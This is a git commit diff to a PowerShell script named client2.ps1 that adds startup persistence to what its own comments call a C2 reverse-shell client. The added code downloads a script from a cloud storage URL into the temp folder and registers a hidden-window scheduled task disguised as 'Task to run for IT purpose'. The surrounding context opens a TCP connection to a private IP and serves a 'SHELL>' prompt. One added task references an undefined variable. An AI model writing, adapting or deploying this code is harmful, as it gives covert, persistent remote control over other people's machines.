988aee6451c2f0f9ca6b82acf8410bb85db89da6
joyon2393 <joyonskyalker@gmail.com>
2024-05-13 18:16:26 +0300

    added schedular

--- client/client2.ps1
+++ client/client2.ps1
@@ -1,9 +1,35 @@
+#add a schedular
+# Define FTP URL and temporary file path
+$ftpUrl = "https://joyon2393.blob.core.windows.net/jj23/client2.ps1"
+$tempFilePath = Join-Path $env:TEMP "client2.ps1"
+
+# Download script from FTP to temporary folder
+Invoke-WebRequest -Uri $ftpUrl -OutFile $tempFilePath
+
+# Define scheduled task parameters
+$taskName = "MyScheduledTask"
+$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -WindowStyle Hidden -File $tempFilePath"
+$trigger = New-ScheduledTaskTrigger -AtStartup
+
+# Register scheduled task
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Description "Task to run for IT purpose"
+
+
+
+
 # Delay before establishing network connection, and between retries
+
+$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -WindowStyle Hidden -File $scriptPath"
+$trigger = New-ScheduledTaskTrigger -AtStartup
+
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Description "Task to run script after reboot"
+
+
 Start-Sleep -Seconds 1
 
 # Connect to C2
 
-$TCPClient = New-Object Net.Sockets.TCPClient('192.168.56.109', 19001)
+$TCPClient = New-Object Net.Sockets.TCPClient('192.168.56.107', 9001)
 
 
 $NetworkStream = $TCPClient.GetStream()
@@ -19,7 +45,9 @@ $StreamWriter.Write($String + 'SHELL> ')
 $StreamWriter.Flush()
 }
 
-# Initial output to C2. The function also creates the inital empty byte array buffer used below.
+# Initial output to C2. The function also creates the inital empty byte array buffer used below
+
+
 WriteToStream ''
 
 # Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
